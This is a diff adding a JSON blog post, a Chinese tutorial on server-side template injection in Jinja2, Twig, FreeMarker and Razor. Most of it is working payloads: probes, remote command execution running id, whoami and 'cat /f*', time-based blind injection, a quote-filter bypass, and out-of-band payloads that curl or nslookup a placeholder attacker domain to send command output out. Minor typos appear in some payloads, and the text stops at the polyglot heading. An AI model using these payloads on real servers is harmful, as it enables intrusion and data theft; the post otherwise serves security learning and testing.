@@ -1,0 +1,323 @@
+{
+  "format": "blocks",
+  "no": "011",
+  "category": "网络安全",
+  "title": "SSTI 模板引擎注入",
+  "date": "2026-08-22",
+  "readingMinutes": 11,
+  "words": 3790,
+  "excerpt": "模板引擎是网站为了呈现网站动态数据，无需重写编写前端代码而产生的",
+  "body": [
+    {
+      "type": "quote",
+      "text": "什么是模板引擎？"
+    },
+    {
+      "type": "p",
+      "text": "模板引擎是网站为了呈现网站动态数据，无需重写编写前端代码而产生的"
+    },
+    {
+      "type": "p",
+      "text": "后端通过参数将变化的数据传递给模板引擎，引擎把数据渲染到对应的前端占位符中，这样就完成了动态的数据呈现"
+    },
+    {
+      "type": "p",
+      "text": "另外，模板引擎不仅支持静态值，还支持函数表达式，可以调用方法，进行数学运算，访问对象属性等"
+    },
+    {
+      "type": "p",
+      "text": "但是如果用户可以控制传递的参数(例如页面需要实时反馈用户的输入，或是类似持久性xss那样的情况)"
+    },
+    {
+      "type": "p",
+      "text": "那么就可能构造一些恶意的payload来截取信息，数据会过一遍后端，所以甚至有可能直接造成rce漏洞"
+    },
+    {
+      "type": "h2",
+      "text": "常见的模板引擎"
+    },
+    {
+      "type": "p",
+      "text": "不同开发语言使用不同的模板引擎，如："
+    },
+    {
+      "type": "list",
+      "ordered": false,
+      "items": [
+        {
+          "text": "python: Jinja  Mako",
+          "level": 0
+        },
+        {
+          "text": "java:FreeMarker  Groovy",
+          "level": 0
+        },
+        {
+          "text": "php: Twig  Smarty  Blade",
+          "level": 0
+        },
+        {
+          "text": ".NET: Razor",
+          "level": 0
+        }
+      ]
+    },
+    {
+      "type": "p",
+      "text": "每种引擎都有自己独特的语法结构，所以需要知道他们直接的区别"
+    },
+    {
+      "type": "h2",
+      "text": "Jinja2 (神社)"
+    },
+    {
+      "type": "p",
+      "text": "第一步是检查是否存在注入的可能\n可以使用经典的载荷：`{{7*7}}`\n在jinja下，这会输出49，因为双大括号{{}}是jinja中标识表达式的标记\n或者可以尝试`{{7*'7'}}`，在jinja下，这会输出7个7，但是在Twig中，会输出49，从这里就可以做出引擎的判断了"
+    },
+    {
+      "type": "h3",
+      "text": "Basic RCE"
+    },
+    {
+      "type": "p",
+      "text": "下面是一个经典的载荷范例："
+    },
+    {
+      "type": "code",
+      "lang": "python",
+      "text": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n{{config['__class__']['__init__']['__glo''bals__']['o''s']['po''pen'](\"cat /f*\")['re''ad']()}}\n\n{{lipsum.globals.os.popen('ls').read()}}\n{{lipsum['__glo''bals__']['o''s']['pop''en'](\"cat /f*\")['re''ad']()}}\n# config是模板中的全局对象，始终存在，储存了程序所有的配置信息\n# __class__读取config对象的class类\n# 接下来是构造方法\n# __globals__对象，这是一个字典，里面包含所有的全局变量，也是所有函数定义的地方\n# 然后访问该字典中的os模块\n# 最后popen用来执行一个系统指令，这会返回一个文档对象，调用read方法读取出来\n"
+    },
+    {
+      "type": "h3",
+      "text": "Blind SSTI"
+    },
+    {
+      "type": "quote",
+      "text": "上面的方法是在模板会实时渲染你所传递内容的情况，那如果一个网站不会将你的输入渲染出来，要如何判断呢？"
+    },
+    {
+      "type": "p",
+      "text": "接下来就是**盲注**了，大概和sqli的盲注差不多"
+    },
+    {
+      "type": "list",
+      "ordered": false,
+      "items": [
+        {
+          "text": "time-based injection 时间盲注",
+          "level": 0
+        }
+      ]
+    },
+    {
+      "type": "p",
+      "text": " 一个常见的时间盲注载荷："
+    },
+    {
+      "type": "code",
+      "lang": "python",
+      "text": "    {{''.__class__.__mro__[1].__subclasses__()[396]('sleep 5',shell=True)}}\n    # 使用该payload后，如果服务器响应的时间超过5秒，则说明你的注入生效了\n    # 使用不同的方式访问python的hercules对象，从一个空字符串开始\n    # 获取它的类，然后查找方法解析顺序\n    # 访问该对象的所有子类，并通过索引找到子进程类的396号\n    # 使用sleep命令调用该进程，索引号可能会因python版本不同变化，但是整体逻辑链路是一样的\n"
+    },
+    {
+      "type": "h3",
+      "text": "OOB(out of band exploitations / 外带攻击)"
+    },
+    {
+      "type": "p",
+      "text": "这可以让目标服务器直接和你的服务器联系起来"
+    },
+    {
+      "type": "list",
+      "ordered": false,
+      "items": [
+        {
+          "text": "DNS解析外带",
+          "level": 0
+        }
+      ]
+    },
+    {
+      "type": "code",
+      "lang": "python",
+      "text": "    {{''.__class__.__mro__[1].__subclasses__()[396]('nslookup 你的域名',shell=True)}}\n    # 服务器执行该操作时，会对你的域名进行dns查询，只要查看自己的域名dns解析记录就可以知道是否注入成功"
+    },
+    {
+      "type": "list",
+      "ordered": false,
+      "items": [
+        {
+          "text": "http外带",
+          "level": 0
+        }
+      ]
+    },
+    {
+      "type": "code",
+      "lang": "python",
+      "text": " {{''.__class__.__mro__[1].__subclasses__()[396]('curl http://你的域名',shell=True)}}\n # 服务器会通过http协议访问你的网站\n\n {{''.__class__.__mro__[1].__subclasses__()[396]('curl http://你的域名/$(whoami)',shell=True)}}\n # 附带数据的http外带，通过$传递命令，目标服务器会执行命令并写回url中，这样就直接到注入这一步了"
+    },
+    {
+      "type": "h3",
+      "text": "Filter Bypass 过滤绕过"
+    },
+    {
+      "type": "p",
+      "text": "有些时候，单双引号可能会被过滤，无法直接传入字符串，这时候可以使用python内置的chr函数来根据*ASCII*码转码为字母"
+    },
+    {
+      "type": "code",
+      "lang": "python",
+      "text": "{{''.__class__.__mro__[1].__subclasses__()[396](chr(105)+chr(100),shell=True,stdout=-1)}}\n# chr(105) -> i     chr(100) -> d"
+    },
+    {
+      "type": "h2",
+      "text": "Twig - PHP"
+    },
+    {
+      "type": "p",
+      "text": "如前文提到的，检测漏洞存在的payload：\n`{{7*7}}` -> 49\n`{{7*'7'}}` -> 49"
+    },
+    {
+      "type": "h3",
+      "text": "Basic RCE"
+    },
+    {
+      "type": "p",
+      "text": "确认漏洞存在，开始测试rce payload"
+    },
+    {
+      "type": "code",
+      "lang": "php",
+      "text": "{{[\"id\"]|fileter(\"system\")}}    // old version .ver<2.4.4\n# id 作为system函数执行的参数\n\n# 新版本阻止了这样危险的过滤器，但是仍然可以使用其他方式利用\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}  //modern version\n# 这会注册一个未定义的过滤器“exec”，然后将id作为参数传给该过滤器执行，两个payload顺序执行"
+    },
+    {
+      "type": "h3",
+      "text": "Blind"
+    },
+    {
+      "type": "code",
+      "lang": "php",
+      "text": "{{[\"sleep 5\"]|filter(\"system\")}}\n"
+    },
+    {
+      "type": "h3",
+      "text": "OOB"
+    },
+    {
+      "type": "list",
+      "ordered": false,
+      "items": [
+        {
+          "text": "DNS OOB",
+          "level": 0
+        }
+      ]
+    },
+    {
+      "type": "code",
+      "lang": "php",
+      "text": "{{[\"nslookup 你的域名\"]|filter(\"system\")}}"
+    },
+    {
+      "type": "list",
+      "ordered": false,
+      "items": [
+        {
+          "text": "http OOB",
+          "level": 0
+        }
+      ]
+    },
+    {
+      "type": "code",
+      "lang": "php",
+      "text": "{{[\"curl http://域名\"]|filter(\"shell_exec\")}}\n{{[\"curl http://域名/$(whoami)\"]|filter(\"shell_exec\")}}\n"
+    },
+    {
+      "type": "h2",
+      "text": "FreeMarkers - Java"
+    },
+    {
+      "type": "p",
+      "text": "FreeMarkers被广泛应用于springboot、struts和其他企业系统中"
+    },
+    {
+      "type": "p",
+      "text": "检测漏洞的payload：\n`${7*7} -> 49`\n不同于上面的两个模板，它有着独特的语法，所以使用这个就可以直接判断了"
+    },
+    {
+      "type": "h3",
+      "text": "Basic RCE"
+    },
+    {
+      "type": "code",
+      "lang": "java",
+      "text": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}\n// 该payload做的事情是：访问一个名为execute的java类，它可以运行系统命令\n// 然后传入id作为参数执行\n//引号中是找到类，后面表示创建一个新的类对象，然后传入id调用"
+    },
+    {
+      "type": "h3",
+      "text": "Blind"
+    },
+    {
+      "type": "code",
+      "lang": "java",
+      "text": "${\"freemarker.template.utility.Execute\"?new()(\"sleep 5\")}"
+    },
+    {
+      "type": "h3",
+      "text": "OOB"
+    },
+    {
+      "type": "code",
+      "lang": "java",
+      "text": "//dns oob\n${\"freemarker.template.utility.Execute\"?new()(\"nslookup 你的域名\")}\n//http oob\n${\"freemarker.template.utility.Execute\"?new()(\"curl http://你的域名/\")}\n//http oob with data\n${\"freemarker.template.utility.Execute\"?new()(\"curl http://你的域名/`whoami`\")}\n// 这里使用`来包裹参数"
+    },
+    {
+      "type": "h2",
+      "text": "Razor - .NET"
+    },
+    {
+      "type": "p",
+      "text": "检测payload：\n`@{7*7} -> 49`"
+    },
+    {
+      "type": "h3",
+      "text": "Basic RCE"
+    },
+    {
+      "type": "code",
+      "lang": "csharp",
+      "text": "@{var proc = new System.Diagnostics.Process();\nproc.StartInfo.FileName = \"cmd.exe\";\nproc.StartInfo.Arguments = \"/c whoami\";\nproc.StartInfo.RedirectStandardOutput = true;\nproc.Start();\nvar output = proc.StandardOutput.ReadToEnd();\nproc.WaitForExit();\n}@output\n// 创建一个进程，进程名为cmd，即win的命令提示符\n//给该进程传递执行参数 /c whoami\n//启用重定向标准输出\n//启动进程\n//将进程标准输出储存在output变量中\n//最后外部调用这个output变量"
+    },
+    {
+      "type": "p",
+      "text": ".NET是微软开发的基于Windows内核的网页框架，因此其模板引擎Razor的运行环境肯定是Windows环境，所以使用cmd.exe"
+    },
+    {
+      "type": "h3",
+      "text": "Blind"
+    },
+    {
+      "type": "code",
+      "lang": "csharp",
+      "text": "@{System.Threading.Thread.Sleep(5000);}\n// 就是让系统进程睡5s"
+    },
+    {
+      "type": "h3",
+      "text": "OOB"
+    },
+    {
+      "type": "code",
+      "lang": "csharp",
+      "text": "@{new System.Net.WebClient().DownloadString(\"http://你的域名\");}\n// 创建一个网络客户端，然后访问\n\n@{var user = System.Enviroment.UserName;\nnew System.Net.WebClient().DownloadString(\"http://你的域名\" + user);}\n// 创建一个变量接收自定义的部分，然后同样的创建网络客户端，并带上自定义数据"
+    },
+    {
+      "type": "h2",
+      "text": "Polyglot 通用多语义载荷"
+    },
+    {
+      "type": "p",
+      "text": "这是一种设计来在多种引擎中通用的载荷"
+    }
+  ]
+}
